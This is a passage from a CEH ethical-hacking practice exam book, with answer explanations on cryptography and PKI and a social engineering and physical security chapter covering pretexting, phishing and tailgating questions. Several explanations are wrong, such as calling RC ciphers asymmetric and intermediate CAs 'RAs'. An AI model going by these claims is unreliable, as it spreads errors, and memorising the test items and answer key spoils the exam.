are (1) client hello, (2) server hello and certificate, (3) server hello done message,
(4) client verifies server identity and sends Client Key Exchange message, (5) client
sends Change Cipher Spec and Finish message, and (6) server responds with Change
Cipher Spec and Finish message. The session key is created by the client after it
verifies the server’s identity (using the certificate provided in step 2).

☐✗ A is incorrect because the server does not create the session key.

☐✗ B is incorrect for the same reason—the client creates the key, not the server.

☐✗ C is incorrect because the client does not use a “public key” for an SSL session. It’s a
great distractor, trying to confuse you with PKI terms in an SSL question.

17. Which encryption algorithm uses variable block sizes (from 32 to 128 bits)?

A. SHA-1

B. RC5

C. 3DES

D. AES

☑ B. Questions on identifying encryption algorithms really come down to memorization
of some key terms. Rivest Cipher (RC) encompasses several versions, from RC2
through RC6. It is an asymmetric block cipher that uses a variable key length up to
2040 bits. RC6, the latest version, uses 128-bit blocks, whereas RC5 uses a variable
block size (32, 64, or 128).

☐✗ A is incorrect because SHA-1 is a hash algorithm, not an encryption algorithm. If this
question were about verifying integrity, this would be a good choice. However, in this
case, it is a distractor.

☐✗ C is incorrect because, although 3DES is a symmetric block cipher, it does not use
variable block sizes. 3DES (called triple DES) uses a 168-bit key and can use up to
three keys in a multiple-encryption method. It’s much more effective than DES but is
much slower.

☐✗ D is incorrect because AES, another symmetric block cipher, uses a key length of
128, 192, or 256 bits. It effectively replaces DES and is much faster than either DES
or its triplicate cousin (3DES).

Chapter 11: Cryptography 101

271

11-ch11.indd 271 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

18. Which hash algorithm was developed by the NSA and produces output values up to
512 bits?

A. MD5

B. SHA-1

C. SHA-2

D. SSL

☑ C. Both SHA-1 and SHA-2 were developed by the NSA; however, SHA-1 produced
only a 160-bit output value. SHA-2 was developed to rectify the shortcomings of
its predecessor and is capable of producing outputs of 224, 256, 384, and 512 bits.
Although it was designed as a replacement for SHA-1 (which was supposed to have
been phased out in 2010), SHA-2 is still not as widely used. As an aside, SHA-3 can
produce 512-bit keys as well.

☐✗ A is incorrect because MD5 produces 128-bit output. It was created by Ronald Rivest for
ensuring file integrity; however, serious flaws in the algorithm, and the advancement
of other hashes, have resulted in this hash being rendered obsolete (U.S. CERT,
August 2010). Despite this, you’ll find MD5 is still used for file verification on
downloads and, in many cases, to store passwords.

☐✗ B is incorrect because SHA-1 produces a 160-bit value output. It was created by NSA
and used to be required by law for use in U.S. government applications. However, serious
flaws became apparent in late 2005, and the U.S. government began recommending the
replacement of SHA-1 with SHA-2 after 2010 (see FIPS PUB 180-1).

☐✗ D is incorrect because SSL isn’t even a hash algorithm. If you picked this one, you
have some serious studying to do.

19. You are concerned about protecting data on your organization’s laptops from loss or theft.
Which of the following technologies best accomplishes this goal?

A. Single sign-on

B. Cloud computing

C. IPSec Tunnel mode

D. Full disk encryption

☑ D. Data-at-rest (DAR) protection is a security technology tailor-made for loss and
theft protection, with one tiny little catch: full disk encryption in DAR sets up a
preboot session that requires valid credentials to unlock the machine. However, it’s
important to note the preboot session will only engage after a full system power
down. If the user just closes the lid and puts the machine into sleep mode, DAR
protection does nothing. Assuming the user does power off the machine before taking
it on a trip, preboot protects everything—including the Master Boot Record—and
ensures that even if the laptop is stolen or lost, the data inside is protected. If the user
doesn’t power off, then DAR is just another security tool that provides the illusion of
security—which may be even worse than having nothing at all.

CEH Certified Ethical Hacker Practice Exams

272

11-ch11.indd 272 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

☐✗ A is incorrect because single sign-on—a method of authentication allowing a user to
access multiple resources with one set of credentials—has nothing to do with loss or
theft protection.

☐✗ B is incorrect because, while cloud computing may provide some data storage and
protection efforts, it does nothing to protect against loss or theft of the laptop, and it
leaves everything on it vulnerable.

☐✗ C is incorrect because, although IPSec Tunnel mode will protect data in transit from
the laptop back into the remote network, it doesn’t provide any protection for the
laptop itself.

20. In a discussion on symmetric encryption, a friend mentions that one of the drawbacks
with this system is scalability. He goes on to say that for every person you add to the mix,
the number of keys increases dramatically. If seven people are in a symmetric encryption
pool, how many keys are necessary?

A. 7

B. 14

C. 21

D. 28

☑ C. Symmetric encryption is really fast and works great with bulk encryption;
however, scalability and key exchange are huge drawbacks. To determine the
number of keys you need, use the formula N(N – 1)/2. Plugging 7 into this, we
have 7(7 – 1)/2 = 21.

☐✗ A is incorrect because, although symmetric encryption does use the same key for
encryption and decryption, each new node requires a different key. Seven keys simply
isn’t enough.

☐✗ B is incorrect because 14 keys isn’t enough.

☐✗ D is incorrect because 28 keys is too many. Stick with the formula N(N – 1)/2.

21. Which of the following is a true statement?

A. Symmetric encryption scales easily and provides for nonrepudiation.

B. Symmetric encryption does not scale easily and does not provide for nonrepudiation.

C. Symmetric encryption is not suited for bulk encryption.

D. Symmetric encryption is slower than asymmetric encryption.

☑ B. Symmetric encryption has always been known for strength and speed; however,
scalability and key exchange are big drawbacks. Additionally, there is no way
to provide for nonrepudiation (within the confines of the encryption system).
Symmetric encryption is good for a great many things when you don’t want all the
overhead of key management.

Chapter 11: Cryptography 101

273

11-ch11.indd 273 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

☐✗ A is incorrect because symmetric encryption does not scale easily and does not provide
for nonrepudiation. The single key used for each channel makes scalability an issue.
Remember, the formula for number of keys is N(N – 1)/2.

☐✗ C is incorrect because symmetric encryption is perfectly designed for bulk encryption.
Assuming you can find a way to ensure the key exchange is protected, speed makes
this the best choice.

☐✗ D is incorrect because one of the benefits of symmetric encryption is its speed. It is
much faster than asymmetric encryption but doesn’t provide some of the benefits
asymmetric provides us (scalability, nonrepudiation, and so on).

22. The PKI system you are auditing has a certificate authority (CA) at the top that creates
and issues certificates. Users trust each other based on the CA. Which trust model is in
use here?

A. Stand-alone CA

B. Web of trust

C. Single authority

D. Hierarchical trust

☑ C. Trust models within PKI systems provide a standardized method for certificate
and key exchanges. The valid trust models include web of trust, single authority, and
hierarchical. The single authority system has a CA at the top that creates and issues
certs. Users then trust each other based on the CA at the top vouching for them.
Assuming a single authority model is used, it’s of vital importance to protect it. After
all, if it is compromised, your whole system is kaput.

☐✗ A is incorrect because stand-alone CA doesn’t refer to a trust model. It instead defines
a single CA that is usually set up as a trusted offline root in a hierarchy or when
extranets and the Internet are involved.

☐✗ B is incorrect because web of trust refers to a model where users create and manage
their own certificates and key exchange, and multiple entities sign certificates for one
another. In other words, users within this system trust each other based on certificates
they receive from other users on the same system.

☐✗ D is incorrect because, although a hierarchical trust system also has a CA at the
top (which is known as the root CA), it makes use of one or more intermediate
CAs underneath it—known as RAs—to issue and manage certificates. This system
is the most secure because users can track the certificate back to the root to ensure
authenticity without a single point of failure.

23. A portion of a digital certificate is shown here:
Version V3
Serial Number 26 43 03 62 e9 6b 39 a4 9e 15 00 c7 cc 21 a2 20
Signature Algorithm sha1RSA
Signature Hash Algorithm sha1
Issuer VeriSign Class 3 Secure Server

CEH Certified Ethical Hacker Practice Exams

274

11-ch11.indd 274 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

Valid From Monday, October 17, 2022 8:00 PM
Valid To Tuesday, October 17, 2023 7:59:59 PM
.
Public Key RSA (2048)
.

Which of the following statements is true?

A. The hash created for the digital signature holds 160 bits.

B. The hash created for the digital signature holds 2048 bits.

C. RSA is the hash algorithm used for the digital signature.

D. This certificate contains a private key.

☑ A. Questions on the digital certificate are usually easy enough, and this is no
exception. The algorithm used to create the hash is clearly defined as Signature
Hash Algorithm (SHA-1), and, as we already know, SHA-1 creates a 160-bit hash
output. This will then be encrypted by the sender’s private key and decrypted on the
recipient’s end with the public key, thus verifying identity.

☐✗ B is incorrect because it is a distractor: the RSA key size of 2048 is listed in the public
key section of the certificate.

☐✗ C incorrect because RSA is not a hash algorithm. It is, without doubt, used as
an encryption algorithm with this certificate (and uses a 2048-bit key to do the
encrypting) but does not hash anything.

☐✗ D is incorrect because, as I’m certain you are already aware, a private key is never
shared. The public key is retained for recipients to use if they want to encrypt
something to send back to the originator, but the private key is never shared.

24. Bit streams are run through an XOR operation. Which of the following is a true statement
for each bit pair regarding this function?

A. If the first value is 0 and the second value is 1, then the output is 0.

B. If the first value is 1 and the second value is 0, then the output is 0.

C. If the first value is 0 and the second value is 0, then the output is 1.

D. If the first value is 1 and the second value is 1, then the output is 0.

☑ D. An XOR operation requires two inputs, and in the case of encryption algorithms,
this would be the data bits and the key bits. Each bit is fed into the operation—one
from the data, the next from the key—and then XOR makes a determination: if the
bits match, the output is 0; if they don’t, it’s 1.

☐✗ A is incorrect because the two values being compared are different; therefore, the
output would be 1.

☐✗ B is incorrect because the two values being compared are different; therefore, the
output would be 1.

☐✗ C is incorrect because the two values being compared are the same; therefore, the
output should be 0.

Chapter 11: Cryptography 101

275

11-ch11.indd 275 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

25. Which of the following attacks attempts to re-send a portion of a cryptographic exchange
in hopes of setting up a communications channel?

A. Known plain text

B. Chosen plain text

C. Man in the middle

D. Replay

☑ D. Replay attacks are most often performed within the context of a man-in-the-
middle attack and not necessarily just for communications channel setup. They’re
also used for DoS attacks against a system, to feed bad data in hopes of corrupting a
system, to try to overflow a buffer (send more encrypted data than expected), and so
on. The hacker repeats a portion of a cryptographic exchange in hopes of fooling the
system into setting up a communications channel. The attacker doesn’t really have to
know the actual data (such as the password) being exchanged; he just has to get the
timing right in copying and then replaying the bit stream. Session tokens can be used
in the communications process to combat this attack.

☐✗ A is incorrect because known plain text doesn’t really have anything to do with this
scenario. Known plain text refers to having both plain-text and corresponding cipher-
text messages, which are scanned for repeatable sequences and then compared to the
cipher-text versions.

☐✗ B is incorrect because it simply doesn’t apply to this scenario. In a chosen plain-
text attack, a hacker puts several encrypted messages through statistical analysis to
determine repeating code.

☐✗ C is incorrect because, in this instance, replay refers to the attack being described
in the question, not man in the middle. I know you think this is confusing, and I
do understand. However, this is an example of the CEH wordplay you’ll need to be
familiar with. Man in the middle is usually listed as an attack by every security guide;
however, within the context of the exam, it may also refer solely to where the attacker
has positioned himself. From this location, he can launch a variety of attacks—replay
being one of them.

26. Within a PKI system, which of the following is an accurate statement?

A. Bill can be sure a message came from Sue by using his public key to decrypt it.

B. Bill can be sure a message came from Sue by using his private key to decrypt it.

C. Bill can be sure a message came from Sue by using her private key to decrypt the
digital signature.

D. Bill can be sure a message came from Sue by using her public key to decrypt the
digital signature.

CEH Certified Ethical Hacker Practice Exams

276

11-ch11.indd 276 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

☑ D. Remember, a digital signature is a hash value that is encrypted with the user’s
private key. Because the corresponding public key can decrypt it, this provides the
nonrepudiation feature we’re looking for. This is the only instance on the exam where
the private key is used for encryption. In general, public encrypts, and private decrypts.
The steps for creating an encrypted message with a digital signature are as follows:

1. Create a hash of the body of the message.

2. Encrypt that hash with your private key (adding it to the message as your signature).

3. Encrypt the entire message with the public key of the recipient.

☐✗ A is incorrect because, not only does this have nothing to do with proving identity,
but it also cannot work. Bill can’t use his own public key to decrypt a message sent to
him. The keys work in pairs—if the message is encrypted with his public key, only his
private key can decrypt it.

☐✗ B is incorrect because this has nothing to do with proving Sue’s identity. Sure, Bill
will be using his own private key to decrypt messages sent to him by other users;
however, it doesn’t provide any help in proving identity.

☐✗ C is incorrect because there is no way Bill should have Sue’s private key. Remember,
private keys are not shared with anyone, for any reason. This is why encrypting a
hash with one works so well for the digital-signing process.

27. A systems administrator is applying digital certificates for authentication and verification
services inside his network. He creates public and private key pairs using Apple’s
Keychain and uses the public key to sign documents that are used throughout the
network. Which of the following certificate types is in use?

A. Public

B. Private

C. Signed

D. Self-signed

☑ D. Security certificates have many uses in networking: for example, applications
and network services might use them for authentication. If you are doing business
across the Internet, your clients will want to ensure a trusted third party signs your
certificates, so they can verify you are indeed legitimate. Internally, though, due to
cost and speed of deployment/maintenance, self-signed certificates are the way to go.
A self-signed certificate is simply one that is signed by the same entity that created
it. Because most of your internal certificate needs can be served without going to an
external CA to verify identity, using self-signed certificates may be the best bet.

☐✗ A and B are incorrect because these are not certificate types.

☐✗ C is incorrect because regular signed certificates are signed and verified by a third-
party certificate authority (CA).

Chapter 11: Cryptography 101

277

11-ch11.indd 277 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11/ Blind Folio: 278

This page intentionally left blank

11-ch11.indd 278 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

CHAPTER

Low Tech: Social 12
Engineering and
Physical Security
This chapter includes questions from the following topics:

• Define social engineering
• Describe different types of social engineering techniques and attacks
• Describe identity theft
• List social engineering countermeasures
• Describe physical security measures

I know a lot of people will pick up a book like this in an effort to train themselves to be a “hacker,”
but I’ve got some news for you: you were already partway there. You’re a born social engineer, and
you’ve most likely been doing some of this stuff since you could walk. In fact, I’ll bet serious cash
you’ll probably employ at least some manipulation of your fellow human beings today, maybe
without even thinking about it.

Don’t believe me? I guarantee if you search your memory banks there was at least once in
your childhood when you talked your way into another piece of candy or few minutes playing
with a toy, just because you were cute. If you had siblings, I bet all of you conspired—at least
once—to cover up something bad or to convince Mom you really needed more ice cream. And
the technique of employing “Well, Dad said it was okay,” pitting Mom against Dad? Oldest trick
in the book.

We all work the system every day because it’s how we are wired, and there’s not a person
reading this book who doesn’t try to influence and manipulate the people around them to gain an
advantage or accomplish a goal. You’ve been doing it since you were born, and you will continue
to do so until you shuffle off this mortal coil. All we’re doing with pen testing and ethical hacking
is bringing those same thoughts and actions to influence our virtual workplace and adding one
slight twist: while most of your manipulation of others isn’t consciously purposeful, it has to be in
the virtual world. There’s a lot of acting, a lot of intuition, and a lot of lying involved, and to be
successful in this area you have to be convincing to pull it off.

The entire subject is fascinating, and there are endless articles, studies, and books devoted to
it. A Kaspersky blog dubbed it “Hacking the Human OS,” which is about as apt a description

279

12-ch12.indd 279 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

as I could ever come up with myself. Social engineering and physical security measures are those
obvious and simple solutions you may accidentally overlook. Why spend all the effort to hack into
a system and crack passwords offline when you can just call someone up and ask for them? Why
bother with trying to steal sensitive business information from encrypted shares when you can
walk into the building and sit in on a sales presentation? Sure, you occasionally almost get arrested
digging around in a dumpster for good information, and you might even get the pleasure of seeing
how powerful a dog handler is, as the vicious, barking animal is held tight on the leash while you
cower in the corner, but a lot of social engineering is just worth it. It’s easy, simple, and effective,
and not an area of your pen testing you can afford to ignore.

STUDY TIPS According to the handy-dandy CEH brochure for the latest
version of the exam, social engineering makes up just less than 4 to 5 percent
of your exam; basically up to five of your questions will be from this arena.
Literally almost nothing has changed in the official courseware from the

previous two versions, and most questions you’ll see about social engineering and physical
security are of the straightforward, definition-based variety. Areas of focus will still include
various social engineering attacks (shoulder surfing, dumpster diving, impersonation,
and so on), security controls (physical, operational, and technical), and biometrics.
Anything new in this section will probably be in the mobile realm (using SMS texting
and cell phones for social engineering, for example), but should be just as easy to
discern as before.

One note of caution, though: be careful with the wording in some of these questions.
For example, tailgating and piggybacking mean the same thing to us in the real world, but
there’s a significant difference when it comes to your exam. It’s true that most of these are
fairly easy to decipher, but EC-Council sometimes likes to focus on minutiae.

CEH Certified Ethical Hacker Practice Exams

280

12-ch12.indd 280 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

QUESTIONS

1. While observing a target organization’s building, you note the lone entrance has a guard Q
posted just inside the door. After entering the external door, you note the lobby of the
building is separated from the external door by a small glass-paneled room, with a closed
door facing the exterior and a closed door to the interior. There appears to be an RFID
scanning device and a small keyboard with video display in the room. Which of the
following best defines this physical security control?

A. Guard shack

B. Turnstile

C. Man shack

D. Man trap

2. In your social engineering efforts, you call the company help desk and pose as a user who
has forgotten a password. You ask the technician to help you reset your password, which
she happily complies with. Which social engineering attack is in use here?

A. Piggybacking

B. Reverse social engineering

C. Technical support

D. Halo effect

3. Which of the following is a true statement regarding biometric systems?

A. The lower the CER, the better the biometric system.

B. The higher the CER, the better the biometric system.

C. The higher the FRR, the better the biometric system.

D. The higher the FAR, the better the biometric system.

4. A pen tester sends an unsolicited e-mail to several users in the target organization. The
e-mail is well crafted and appears to be from the company’s help desk, advising users
of potential network problems. The e-mail provides a contact number to call in the
event a user is adversely affected. The pen tester then performs a denial of service on
several systems and receives phone calls from users asking for assistance. Which social
engineering practice is in play here?

A. Technical support

B. Impersonation

C. Phishing

D. Reverse social engineering

Chapter 12: Low Tech: Social Engineering and Physical Security

281

12-ch12.indd 281 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

5. A pen test member has gained access to a building and is observing activity as he wanders
around. In one room of the building, he stands just outside a cubicle wall opening and
watches the onscreen activity of a user. Which social engineering attack is in use here?

A. Eavesdropping

B. Tailgating

C. Shoulder surfing

D. Piggybacking

6. A recent incident investigated by the local IR team involved a user receiving an e-mail
that appeared to be from the U.S. Postal Service, notifying her of a package headed her
way and providing a link for tracking the package. The link provided took the user to
what appeared to be the USPS site, where she input her user information to learn about
the latest shipment being delivered. Which attack did the user fall victim to?

A. Phishing

B. Internet level

C. Reverse social engineering

D. Impersonation

7. Which type of social engineering attack uses phishing, pop-ups, and IRC channels?

A. Technical

B. Computer based

C. Human based

D. Physical

8. An attacker identifies a potential target and spends some time profiling her. After gaining
some information, the attacker sends a text to the target’s cell phone. The text appears
to be from the user’s bank and advises her to call a provided phone number immediately
regarding her account information. She dials the number and provides sensitive
information to the attacker, who is posing as a bank employee. Which of the following best
defines this attack?

A. Vishing

B. Smishing

C. Phishing

D. Tishing

9. Which of the following constitutes the highest risk to the organization?

A. Black-hat hacker

B. White-hat hacker

C. Gray-hat hacker

D. Disgruntled employee

CEH Certified Ethical Hacker Practice Exams

282

12-ch12.indd 282 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

10. After observing a target organization for several days, you discover that finance and HR
records are bagged up and placed in an outside storage bin for later shredding/recycling.
One day you simply walk to the bin and place one of the bags in your vehicle, with plans
to rifle through it later. Which social engineering attack was used here?

A. Offline

B. Physical

C. Piggybacking

D. Dumpster diving

11. An attacker waits outside the entry to a secured facility. After a few minutes an authorized
user appears with an entry badge displayed. He swipes a key card and unlocks the door.
The attacker, with no display badge, follows him inside. Which social engineering attack
just occurred?

A. Tailgating

B. Piggybacking

C. Identity theft

D. Impersonation

12. Tim is part of a pen test team and is attempting to gain access to a secured area of
the campus. He stands outside a badged entry gate and pretends to be engaged in a
contentious cell phone conversation. An organization employee walks past and badges
the gate open. Tim asks the employee to hold the gate while flashing a fake ID badge
and continuing his phone conversation. He then follows the employee through the gate.
Which of the following best defines this effort?

A. Shoulder surfing

B. Piggybacking

C. Tailgating

D. Drafting

13. Which of the following may be effective countermeasures against social engineering?
(Choose all that apply.)

A. Security policies

B. Operational guidelines

C. Appropriately configured IDS

D. User education and training

E. Strong firewall configuration

Chapter 12: Low Tech: Social Engineering and Physical Security

283

12-ch12.indd 283 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

14. Which of the following are indicators of a phishing e-mail? (Choose all that apply.)

A. It does not reference you by name.

B. It contains misspelled words or grammatical errors.

C. It contains spoofed links.

D. It comes from an unverified source.

15. You are discussing physical security measures and are covering background checks on
employees and policies regarding key management and storage. Which type of physical
security measures are being discussed?

A. Physical

B. Technical

C. Operational

D. Practical

16. Which of the following resources can assist in combating phishing in your organization?
(Choose all that apply.)

A. Phishkill

B. Netcraft

C. Phishtank

D. IDA Pro

17. An attacker targets a specific group inside the organization. After some time profiling
the group, she notes several websites the individual members of the group all visit on a
regular basis. She spends time inserting various malware and malicious code into some of
the more susceptible websites. Within a matter of days, one of the group member’s system
installs the malware from an infected site, and the attacker uses the infected machine as a
pivot point inside the network. Which of the following best defines this attack?

A. Spear phishing

B. Whaling

C. Web-ishing

D. Watering hole attack

18. Which type of social engineering makes use of impersonation, dumpster diving, shoulder
surfing, and tailgating?

A. Physical

B. Technical

C. Human based

D. Computer based

CEH Certified Ethical Hacker Practice Exams

284

12-ch12.indd 284 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

19. In examining the About Us link in the menu of a target organization’s website, an
attacker discovers several different individual contacts within the company. To one of
these contacts, she crafts an e-mail asking for information that appears to come from
an individual within the company who would be expected to make such a request.
The e-mail provides a link to click, which then prompts for the contact’s user ID and
password. Which of the following best describes this attack?

A. Trojan e-mailing

B. Spear phishing

C. Social networking

D. Operational engineering

20. A security admin has a control in place that embeds a unique image into e-mails on
specific topics in order to verify the message as authentic and trusted. Which anti-
phishing method is being used?

A. Steganography

B. Sign-in seal

C. PKI

D. CAPTCHA

21. Which of the following should be in place to assist as a social engineering
countermeasure? (Choose all that apply.)

A. Classification of information

B. Strong security policy

C. User education

D. Strong change management process

22. Joe uses a user ID and password to log in to the system every day. Jill uses a PIV card and
a PIN. Which of the following statements is true?

A. Joe and Jill are using single-factor authentication.

B. Joe and Jill are using two-factor authentication.

C. Joe is using two-factor authentication.

D. Jill is using two-factor authentication.

23. A system owner has implemented a retinal scanner at the entryway to the data floor.
Which type of physical security measure is this?

A. Technical

B. Single factor

C. Computer based

D. Operational

Chapter 12: Low Tech: Social Engineering and Physical Security

285

12-ch12.indd 285 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

24. Which of the following is the best representation of a technical control?

A. Air conditioning

B. Security tokens

C. Automated humidity control

D. Fire alarms

E. Security policy

25. Which of the following best describes pharming?

A. An attacker redirects victims to a malicious website by sending an e-mail that
provides a URL that appears to be legitimate.

B. An attacker redirects victims to a malicious website by modifying their host
configuration file or by exploiting vulnerabilities in DNS.

C. An attacker targets specific members of an organization based on their duties, roles,
or responsibilities.

D. An attacker inserts malicious code and malware into sites employees visit on a
regular basis.

CEH Certified Ethical Hacker Practice Exams

286

12-ch12.indd 286 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

QUICK ANSWER KEY

1. D 10. D 19. B

2. C 11. B 20. B

3. A 12. C 21. A, B, C, D

4. D 13. A, B, D 22. D

5. C 14. A, B, C, D 23. A

6. A 15. C 24. B

7. B 16. B, C 25. B

8. B 17. D

9. D 18. C

Chapter 12: Low Tech: Social Engineering and Physical Security

287

12-ch12.indd 287 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

ANSWERS

A 1. While observing a target organization’s building, you note the lone entrance has a guard
posted just inside the door. After entering the external door, you note the lobby of the
building is separated from the external door by a small glass-paneled room, with a closed
door facing the exterior and a closed door to the interior. There appears to be an RFID
scanning device and a small keyboard with video display in the room. Which of the
following best defines this physical security control?

A. Guard shack

B. Turnstile

C. Man shack

D. Man trap

☑ D. If you took a test on college football history, you know it would contain a
question about Alabama. If you took one on trumpet players, there’d be one about
Dizzy Gillespie. And if you take a test on physical security measures for Certified
Ethical Hacker, you’re going to be asked about the man trap.

A man trap is nothing more than a locked space you can hold someone in while
verifying their right to proceed into the secured area. It’s usually a glass (or clear
plastic) walled room that locks the exterior door as soon as the person enters. Then
there is some sort of authentication mechanism, such as a smartcard with a PIN or a
biometric system. Assuming the authentication is successful, the second door leading
to the interior of the building will unlock, and the person is allowed to proceed. If
it’s not successful, the doors will remain locked until the guard can check things out.
As an aside, in addition to authentication, some man traps add other checks, such as
measuring the person’s weight to see if they’ve mysteriously gained or lost 20 pounds
since Friday.

A few other notes here may be of use to you: First, I’ve seen a man trap defined as
either manual or automatic, where manual has a guard locking and unlocking the
doors and automatic has the locks tied to the authentication system, as described
previously. Second, a man trap is also referred to in some definitions as an air lock.
Should you see that term on the exam, know that it is referring to the man trap.
Third, man traps in the real world can sometimes come in the form of a rotating
door or turnstile, locking partway around if the person doesn’t authenticate properly.
And, on some of the really fancy ones, sensors will lock the man trap if two people
are trying to get through at the same time.

And, finally, one last note of importance—a man trap is also defined or known as an
access control vestibule. Just rolls right off the tongue, doesn’t it?

☐✗ A is incorrect because this question is not describing a small location at a gate where
guards are stationed. Traditionally, guard shacks are positioned at gates to the exterior
wall or the gate of the facility, where guards can verify identity before allowing
people through to the parking lot.

CEH Certified Ethical Hacker Practice Exams

288

12-ch12.indd 288 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

☐✗ B is incorrect because a turnstile is not being described here, and, frankly, it does
absolutely nothing for physical security. Anyone who has spent any time in subway
systems knows this is true: watching people jump the turnstiles is a great spectator sport.

☐✗ C is incorrect because, so far as I know, man shack is not a physical security term
within CEH. It’s maybe the title of a 1970s disco hit, but not a physical security term
you’ll need to know for the exam.

2. In your social engineering efforts, you call the company help desk and pose as a user who
has forgotten a password. You ask the technician to help you reset your password, which
she happily complies with. Which social engineering attack is in use here?

A. Piggybacking

B. Reverse social engineering

C. Technical support

D. Halo effect

☑ C. Although it may seem silly to label social engineering attacks (because many
of them contain the same steps and bleed over into one another), you’ll need to
memorize them for your exam. A technical support attack is one in which the
attacker calls the support desk in an effort to gain a password reset or other useful
information. This is a valuable method because if you get the right help desk person
(that is, someone susceptible to a smooth-talking social engineer), you can get the
keys to the kingdom.

☐✗ A is incorrect because piggybacking refers to a method to gain entrance to a facility—
not to gain passwords or other information. Piggybacking is a tactic whereby
the attacker follows authorized users through an open door without any visible
authorization badge at all.

☐✗ B is incorrect because reverse social engineering refers to a method where an attacker
convinces a target to call him with information. The method involves marketing
services (providing the target with your phone number or e-mail address in the event
of a problem), sabotaging the device, and then awaiting for a phone call from the user.

☐✗ D is incorrect because halo effect refers to a psychological principle that states a
person’s overall impression (appearance or pleasantness) can impact another person’s
judgment of them. For example, a good-looking, pleasant person will be judged as
more competent and knowledgeable simply because of their appearance. The lesson
here is to look good and act nice while you’re trying to steal all the target’s information.

3. Which of the following is a true statement regarding biometric systems?

A. The lower the CER, the better the biometric system.

B. The higher the CER, the better the biometric system.

C. The higher the FRR, the better the biometric system.

D. The higher the FAR, the better the biometric system.

Chapter 12: Low Tech: Social Engineering and Physical Security

289

12-ch12.indd 289 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

☑ A. The crossover error rate (CER) is the point on a chart where the false acceptance
rate (FAR) and false rejection rate (FRR) meet, and the lower the number, the better
the system. It’s a means by which biometric systems are calibrated—getting the FAR
and FRR the same. All that said, though, keep in mind that in certain circumstances
a client may be more interested in a lower FAR than FRR, or vice versa, and therefore
the CER isn’t as much a concern. For example, a bank may be far more interested
in preventing false acceptance than it is in preventing false rejection. In other words,
so what if a user is upset they can’t log on, so long as their money is safe from a false
acceptance?

☐✗ B is incorrect because this is exactly the opposite of what you want. A high CER
indicates a system that more commonly allows unauthorized users through and
rejects truly authorized people from access.

☐✗ C is incorrect because the false rejection rate needs to be as low as possible. The
FRR represents the amount of time a true, legitimate user is denied access by the
biometric system.

☐✗ D is incorrect because the false acceptance rate needs to be as low as possible. The
FAR represents the amount of time an unauthorized user is allowed access to the
system.

4. A pen tester sends an unsolicited e-mail to several users in the target organization. The
e-mail is well crafted and appears to be from the company’s help desk, advising users
of potential network problems. The e-mail provides a contact number to call in the
event a user is adversely affected. The pen tester then performs a denial of service on
several systems and receives phone calls from users asking for assistance. Which social
engineering practice is in play here?

A. Technical support

B. Impersonation

C. Phishing

D. Reverse social engineering

☑ D. This may turn out to be a somewhat confusing question for some folks, but
it’s actually pretty easy. Reverse social engineering involves three steps. First, in the
marketing phase, an attacker advertises himself as a technical point of contact for
problems that may be occurring soon. Second, in the sabotage phase, the attacker
performs a denial of service or other attack on the user. Third, in the tech support
phase, the user calls the attacker and freely hands over information, thinking they are
being assisted by the company’s technical support team.

As an aside, there are two things to remember about employing this social engineering
practice in the real world. First, be sure to market to the appropriate audience:
attempting this against IT staff probably won’t work as well as the “average” user and
may get you caught. Second, and perhaps more important, you’ll need to remember
that the more lies you tell, the more things you have to make true. Complexity is risky,

CEH Certified Ethical Hacker Practice Exams

290

12-ch12.indd 290 22/04/22 4:46 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 12

and reverse social engineering involves a lot of complexity. It’s best used in special
cases, and then only if you can’t find something else to do.

☐✗ A is incorrect because a technical support attack involves the attacker calling a technical
support help desk, not having the user calling back with information.

☐✗ B is incorrect because this is not just impersonation—the attack described in the
question revolves around the user contacting the attacker, not the other way around.
Impersonation can cover anybody, from a “normal” user to a company executive.
And impersonating a technical support person can result in excellent results; just
remember if you’re going through steps to have the user call you back, you’ve moved
into reverse social engineering.

☐✗ C is incorrect because a phishing attack involves an e-mail crafted to appear legitimate
but in fact contains links to fake websites or to download malicious content. In this
example, there is no link to click—just a phone number to call in case of trouble.
Oddly enough, in my experience, people will question a link in an e-mail far more
